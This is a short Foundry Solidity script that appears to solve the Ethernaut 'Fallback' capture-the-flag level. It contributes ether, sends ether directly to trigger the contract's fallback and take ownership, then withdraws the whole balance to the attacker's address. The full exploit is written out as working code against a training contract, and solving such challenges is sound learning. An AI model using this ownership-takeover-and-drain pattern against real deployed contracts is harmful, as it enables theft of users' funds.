pragma solidity ^0.8.0;

import "../instances/Ilevel01.sol";
import "forge-std/Script.sol";

contract Level01 is Script {
    Fallback level01 =
        Fallback(payable(0xE97Bdfe9a847e0aeE9e4950157c36C3894a29B20));

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        level01.contribute{value: 0.0005 ether}();
        payable(address(level01)).call{value: 0.0005 ether}("");
        level01.withdraw();
        require(address(level01).balance == 0, "balance not 0");
        require(level01.owner() == attacker, "owner not attacker");
        vm.stopBroadcast();
    }
}
